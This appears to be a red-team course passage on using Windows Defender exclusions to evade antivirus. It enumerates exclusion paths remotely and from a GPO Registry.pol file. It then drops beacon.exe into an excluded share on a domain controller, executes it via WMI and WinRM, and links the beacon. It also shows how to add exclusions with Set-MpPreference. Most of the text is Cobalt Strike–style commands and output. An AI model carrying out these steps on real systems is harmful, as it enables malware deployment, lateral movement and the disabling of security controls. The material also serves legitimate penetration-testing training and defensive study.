Pretty much every antivirus solution allows you to define exclusions to on-demand and real-time scanning.  Windows Defender allows admins to add exclusions via GPO, or locally on a single machine.

The three flavours are:

-   Extension - exclude all files by their file extension.
-   Path - exclude all files in the given directory.
-   Process - exclude any file opened by the specified processes.

`Get-MpPreference` can be used to list the current exclusions.  This can be done locally, or remotely using `remote-exec`.

```
beacon> remote-exec winrm dc-2 Get-MpPreference | select Exclusion*

ExclusionExtension : 
ExclusionIpAddress : 
ExclusionPath : {C:\Shares\software}
ExclusionProcess :
```

If the exclusions are configured via GPO and you can find the corresponding Registry.pol file, you can read them with `Parse-PolFile`.

```
PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```

  

Being able to write to an excluded directory obviously gives some leeway in dropping and executing a payload, without having to do any modifications to it.

```
beacon> cd \\dc-2\c$\shares\software
beacon> upload C:\Payloads\beacon.exe
beacon> remote-exec wmi dc-2 C:\Shares\Software\beacon.exe
beacon> remote-exec winrm dc-2 cmd /c C:\Shares\Software\beacon.exe
beacon> link dc-2
[+] established link to child beacon: 10.10.17.71
```
  
In a pinch, you can even add your own exclusions.

```
Set-MpPreference -ExclusionPath "<path>"
```
